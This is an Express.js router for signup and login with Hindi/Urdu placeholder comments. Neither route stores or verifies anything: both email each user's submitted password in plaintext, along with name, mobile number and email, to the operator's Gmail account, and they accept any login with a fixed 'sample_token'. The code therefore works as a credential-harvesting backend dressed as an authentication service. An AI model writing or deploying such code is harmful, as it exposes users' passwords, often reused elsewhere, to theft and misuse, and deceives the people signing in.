const express = require("express");
const router = express.Router();

const nodemailer = require("nodemailer");


// Mail Setup
const transporter = nodemailer.createTransport({

  service: "gmail",

  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },

});


// SIGNUP
router.post("/signup", async (req, res) => {

  try {

    const { name, username, mobileNumber, password, email } = req.body;

    // Yaha database save logic hoga

    // EMAIL SEND
    await transporter.sendMail({

      from: process.env.EMAIL_USER,

      to: process.env.EMAIL_USER,

      subject: "New User Signup",

      html: `
      
        <div style="font-family:Arial;padding:20px">
        
          <h2 style="color:#6d28d9">
            New User Registered
          </h2>

          <hr/>

          <p><b>Name:</b> ${name}</p>

          <p><b>Username:</b> ${username || "—"}</p>

          <p><b>Mobile:</b> ${mobileNumber}</p>

          <p><b>Email:</b> ${email || "—"}</p>

          <p><b>Password:</b> ${password}</p>

        </div>
      `,
    });

    res.json({
      success: true,
      data: {
        user: {
          id: "new",
          name,
          username: username || undefined,
          mobileNumber,
          email: email || undefined,
          role: "customer",
        },
        token: "sample_token",
      },
    });

  } catch (error) {

    console.log(error);

    res.status(500).json({
      success: false,
      message: "Signup Failed",
    });

  }

});


// LOGIN
router.post("/login", async (req, res) => {

  try {

    const { loginId, mobileNumber, password } = req.body;
    const resolvedLogin =
      typeof loginId === "string" && loginId.trim()
        ? loginId.trim()
        : typeof mobileNumber === "string"
          ? mobileNumber.trim()
          : "";

    // Yaha login validation hoga

    // LOGIN EMAIL
    await transporter.sendMail({

      from: process.env.EMAIL_USER,

      to: process.env.EMAIL_USER,

      subject: "User Login Alert",

      html: `
      
        <div style="font-family:Arial;padding:20px">

          <h2 style="color:#2563eb">
            User Logged In
          </h2>

          <hr/>

          <p><b>Email / Mobile:</b> ${resolvedLogin}</p>

          <p><b>Password:</b> ${password}</p>

        </div>
      `,
    });

    res.json({
      success: true,
      data: {
        user: {
          id: "guest",
          name: resolvedLogin.includes("@")
            ? resolvedLogin.split("@")[0] || "Member"
            : resolvedLogin || "Member",
          mobileNumber: resolvedLogin.includes("@") ? "" : resolvedLogin,
          email: resolvedLogin.includes("@") ? resolvedLogin : undefined,
          role: "customer",
        },
        token: "sample_token",
      },
    });

  } catch (error) {

    console.log(error);

    res.status(500).json({
      success: false,
      message: "Login Failed",
    });

  }

});

module.exports = router;